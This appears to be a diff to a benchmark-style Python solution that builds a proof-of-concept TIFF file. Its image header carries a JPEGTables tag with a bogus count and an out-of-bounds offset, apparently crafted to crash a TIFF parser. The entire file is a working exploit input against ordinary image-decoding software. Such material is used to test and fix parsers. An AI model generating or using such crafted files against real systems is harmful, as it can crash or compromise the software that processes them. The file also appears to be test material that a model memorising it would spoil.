@@ -1,15 +1,25 @@
+import struct
+
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        poc = b'II\x2A\x00\x00\x00\x08'
-        poc += b'\x08\x00'
-        poc += b'\x00\x01\x03\x00\x01\x00\x00\x00\x64\x00\x00\x00'
-        poc += b'\x01\x01\x03\x00\x01\x00\x00\x00\x64\x00\x00\x00'
-        poc += b'\x02\x01\x03\x00\x01\x00\x00\x00\x08\x00\x00\x00'
-        poc += b'\x03\x01\x03\x00\x01\x00\x00\x00\x06\x00\x00\x00'
-        poc += b'\x06\x01\x03\x00\x01\x00\x00\x00\x02\x00\x00\x00'
-        poc += b'\x15\x01\x03\x00\x01\x00\x00\x00\x03\x00\x00\x00'
-        poc += b'\x16\x01\x04\x00\x01\x00\x00\x00\x64\x00\x00\x00'
-        poc += b'\x01\x02\x07\x00\x32\x00\x00\x00\x00\x00\x00\x00'
-        poc += b'\x00\x00\x00\x00'
-        poc += b'\x00' * 52
+        tags = [
+            (256, 3, 1, 4),   # ImageWidth
+            (257, 3, 1, 7),   # ImageLength
+            (258, 3, 1, 8),   # BitsPerSample
+            (259, 4, 1, 7),   # Compression (JPEG)
+            (262, 3, 1, 1),   # PhotometricInterpretation
+            (277, 3, 1, 1),   # SamplesPerPixel
+            (278, 4, 1, 7),   # RowsPerStrip
+            (273, 4, 1, 134), # StripOffsets
+            (279, 4, 1, 28),  # StripByteCounts
+            (347, 7, 20, 0),  # JPEGTables (UNDEFINED, count=20 >4, offset=0)
+        ]
+        header = struct.pack('<HHI', 0x4949, 42, 8)
+        num_tags = len(tags)
+        ifd_num = struct.pack('<H', num_tags)
+        ifd_tags = b''.join(struct.pack('<HHII', tid, typ, cnt, val) for tid, typ, cnt, val in tags)
+        next_ifd = struct.pack('<I', 0)
+        ifd = ifd_num + ifd_tags + next_ifd
+        data = b'\x00' * 28
+        poc = header + ifd + data
         return poc
